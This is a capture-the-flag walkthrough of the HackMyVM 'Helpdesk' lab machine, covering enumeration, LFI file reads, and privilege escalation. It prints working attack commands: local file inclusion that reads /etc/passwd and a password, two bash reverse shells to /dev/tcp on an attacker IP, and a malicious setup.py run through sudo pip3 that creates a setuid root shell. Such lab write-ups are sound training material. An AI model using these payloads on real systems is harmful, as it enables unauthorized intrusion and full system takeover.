---
title: HackMyVM - Helpdesk Walkthrough
description: Step-by-step walkthrough of the Helpdesk vulnerable machine.
publishDate: "2025-09-19T16:00:00Z"
---

![Pwned machine](/portfolio/Helpdesk_Pwned.png)
*Figure 1: Pwned machine*

## Introduction

In this walkthrough, I’ll be demonstrating the process of identifying and exploiting vulnerabilities on a machine called Helpdesk. This vulnerable machine can be found on [HackMyVM](https://hackmyvm.eu/machines/machine.php?vm=Helpdesk).  

## Description
HelpDesk is a beginner-friendly CTF machine that simulates a vulnerable corporate helpdesk portal. The challenge focuses on web enumeration, exploiting a Local File Inclusion (LFI) vulnerability to gain access to sensitive files and credentials, and leveraging those credentials for remote code execution. After gaining an initial foothold, privilege escalation is achieved by exploiting misconfigured sudo permissions, ultimately resulting in root access. The machine teaches key skills like directory fuzzing, log poisoning, and privilege escalation through misconfigurations.

## Lab Setup
For this lab we will use Oracle VirtualBox. We are going to use a Kali Linux machine to attack the Helpdesk Machine. To isolate our machines from the host device we are going to edit the network configuration of the machines.




## Reconnaissance
At first we need to do some Reconnaissance. To do so we can scan our target using **nmap**. 

```bash
nmap -T4 -A -v 192.168.56.102
```
The nmap results are the following: 

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b4:bc:42:f6:d0:a7:0d:fd:71:01:3d:8a:c5:0c:ac:e3 (ECDSA)
|_  256 71:90:08:58:14:04:09:d5:cf:31:ee:87:17:ad:29:8f (ED25519)
80/tcp open  http    Apache httpd
|_http-title: HelpDesk Ticket System
|_http-server-header: Apache
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```

As we can see the vulnerable machine is an Apache Web Server. The machine has **ssh and http** running.


### Tip - Local DNS Mapping

Always when I do CTF machines I make a mapping of the address with a DNS entry in order to have it easier to perform commands. To do so I need to edit the **/etc/hosts** file. 

```bash
nano /etc/host.conf
```
We are going to add the following entry: 

```bash
192.168.56.102  helpdesk
```

### Directory Enumeration

To enumerate directories on the web server, we can use **feroxbuster**. This helps in identifying hidden directories and files that might not be immediately visible. We can enter the following command to find these:

```bash
feroxbuster --url "http://helpdesk/" --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .php,.html-s 301 302
```

The following results are displayed:

```bash
200      GET       56l      138w     1290c http://helpdesk/
200      GET       86l      167w     1819c http://helpdesk/login.php
200      GET       56l      138w     1290c http://helpdesk/index.php
301      GET        7l       20w      235c http://helpdesk/javascript => http://helpdesk/javascript/
301      GET        7l       20w      233c http://helpdesk/helpdesk => http://helpdesk/helpdesk/
200      GET        5l       28w      204c http://helpdesk/ticket.php
302      GET        0l        0w        0c http://helpdesk/panel.php => login.php
200      GET        5l       29w      250c http://helpdesk/debug.php
301      GET        7l       20w      242c http://helpdesk/javascript/jquery => http://helpdesk/javascript/jquery/
200      GET    10907l    44549w   289782c http://helpdesk/javascript/jquery/jquery

```


We discovered several interesting endpoints like **login.php**, **ticket.php**, **panel.php** (redirects to login), and **debug.php** which might contain useful information for exploitation.


## Fuzz Parameters on ticket.php 
If we open ticket.php we can see that it is a ticket viewer. Hence it obviously expects a parameter since every ticket has a different ID for example. 

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'http://helpdesk/ticket.php?FUZZ=id' --fw 24 
```
Results: 

```bash

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://helpdesk/ticket.php?FUZZ=id
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 24
________________________________________________

url                     [Status: 200, Size: 271, Words: 30, Lines: 5, Duration: 74ms]
:: Progress: [6453/6453] :: Job [1/1] :: 1307 req/sec :: Duration: [0:00:07] :: Errors: 0 ::
```

As we can see the page expects a **url** as a parameter. This indicates that ticket.php is processing this parameter and could be vulnerable to further attacks (like LFI).


### Testing the parameter
After this interesting find I decided to test the parameter. I entered the following url: http://helpdesk/ticket.php?url=/etc/passwd and funny enough I got the content of the passwd file meaning that the test worked. 

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
messagebus:x:101:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:102:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:103:104::/nonexistent:/usr/sbin/nologin
uuidd:x:104:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:105:107::/nonexistent:/usr/sbin/nologin
tss:x:106:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:107:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
mrmidnight:x:1000:1000:MrMidnight:/home/mrmidnight:/bin/bash
mysql:x:110:110:MySQL Server,,,:/nonexistent:/bin/false
helpdesk:x:1001:1001::/home/helpdesk:/bin/bash
```
### Viewing login.php source code
Including login.php with LFI is a way to peek into the server’s source code to gather information that might help us log in or escalate privileges. So let's do that. 


```bash
curl "http://helpdesk/ticket.php?url=login.php"
```

```bash
// Stored credentials
$stored_user = 'helpdesk';

// SHA-512 hash for password: ticketmaster
$stored_hash = '$6$ABC123$fLo2MacCV.XBQeRZtHWL2297q/fUBs/b8gOmvLGuiz7wDgl3MSWcOOSKnTbaNPoUMCmEpY1dlwuPKbAtIuoo6.';
```

## Remote Command Panel

We were able to find the stored credentials which is perfect. With these credentials, I can now log in via the web panel or use them for SSH access if the same credentials exist for system accounts. After trying the credentials didn't work for the ssh login despite there being a user named helpdesk but we managed to log in to the web panel. 


![Web Panel login](/portfolio/webpanel.png)
*Figure 2: Web Panel after login*


### Reverse Shell
Because the ssh connection could not be established we decided to use a reverse shell in order to connect. 
We enter this on the attacking machine: 
```bash
nc -lvnp 4444
```

On the remote command panel we enter: 

```bash
bash -c "bash -i >& /dev/tcp/192.168.56.101/4444 0>&1"
```

As we can see we got access to a shell. 

```bash
listening on [any] 4444 ...
connect to [192.168.56.101] from (UNKNOWN) [192.168.56.102] 35698
bash: cannot set terminal process group (847): Inappropriate ioctl for device
bash: no job control in this shell
bash-5.2$ 
```

I entered the command **id** to see which user are we. 

```bash
bash-5.2$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```


## Gaining access to helpdesk

```bash
bash-5.2$ ls -la /opt
ls -la /opt
total 16
drwxr-xr-x  4 root     root     4096 Aug 16 15:32 .
drwxr-xr-x 23 root     root     4096 Aug 16 15:58 ..
drwxr-xr-x  2 root     root     4096 Aug 16 16:13 dev_server
drwxr-xr-x  2 helpdesk helpdesk 4096 Sep 18 17:33 helpdesk-socket
```
/opt contains optional software. The helpdesk-socket directory is writable by the helpdesk user, making it a potential vector for privilege escalation.

```bash
ls -la
total 16
drwxr-xr-x 2 helpdesk helpdesk 4096 Sep 18 17:33 .
drwxr-xr-x 4 root     root     4096 Aug 16 15:32 ..
-rwxr-xr-x 1 helpdesk helpdesk  158 Aug 16 15:32 handler.sh
srwxrwxrwx 1 helpdesk helpdesk    0 Sep 18 17:33 helpdesk.sock
-rw-r--r-- 1 root     root      184 Aug 16 15:44 serve.sh
```

```bash
bash-5.2$ cat serve.sh
cat serve.sh
#!/bin/bash

SOCKET="/opt/helpdesk-socket/helpdesk.sock"

[ -e "$SOCKET" ] && rm "$SOCKET"

/usr/bin/socat -d -d UNIX-LISTEN:$SOCKET,fork,mode=777 EXEC:/opt/helpdesk-socket/handler.sh
```

serve.sh starts a Unix socket at /opt/helpdesk-socket/helpdesk.sock using socat, which executes handler.sh for every connection; the socket is world-writable, making it a potential vector for privilege escalation.


### Reverse shell via the writable socket
```bash
echo "/bin/bash -i >& /dev/tcp/192.168.56.101/5555 0>&1" | socat - /opt/helpdesk-socket/helpdesk.sock
```

```bash
listening on [any] 5555 ...
connect to [192.168.56.101] from (UNKNOWN) [192.168.56.102] 59514
bash: cannot set terminal process group (676): Inappropriate ioctl for device
bash: no job control in this shell
bash-5.2$ id
id
uid=1001(helpdesk) gid=1001(helpdesk) groups=1001(helpdesk)
```


```bash
sudo -l
```

```bash
User helpdesk may run the following commands on helpdesk:
    (ALL) NOPASSWD: /usr/bin/pip3 install --break-system-packages *
```

```bash
mkdir /tmp/evil && cd /tmp/evil
```

```bash
cat setup.py
```


```bash
# /tmp/evil/setup.py
from setuptools import setup
import os

os.system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash")

setup(
    name="evil",
    version="0.1",
    description="evil package",
    py_modules=[]
)
```

```bash
echo 'from setuptools import setup; import os; os.system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"); setup(name="evil", version="0.1", description="evil package", py_modules=[])' > /tmp/evil/setup.py
<evil package", py_modules=[])' > /tmp/evil/setup.py
```

```bash
sudo /usr/bin/pip3 install --break-system-packages .
```

```bash
Processing /tmp/evil
  Preparing metadata (setup.py): started
  Preparing metadata (setup.py): finished with status 'done'
Building wheels for collected packages: evil
  Building wheel for evil (setup.py): started
  Building wheel for evil (setup.py): finished with status 'done'
  Created wheel for evil: filename=evil-0.1-py3-none-any.whl size=896 sha256=758d85fb642ae32b15b70003a5e7bb500acd29d138e0adfcbaeda26fe26124ac
  Stored in directory: /tmp/pip-ephem-wheel-cache-ltoix1m9/wheels/0b/1a/8f/6c60c7ea43f95d871ebf1bfd217a531ca290bd8fe23942389f
Successfully built evil
Installing collected packages: evil
Successfully installed evil-0.1
WARNING: Running pip as the 'root' user can result in broken permissions and conflicting behaviour with the system package manager. It is recommended to use a virtual environment instead: https://pip.pypa.io/warnings/venv
```

```bash
/tmp/rootbash -p
```

```bash
cat /root/root.txt /home/helpdesk/user.txt 
flag{request_has_been_escalated}
flag{ticket_approved_by_thedesk}
```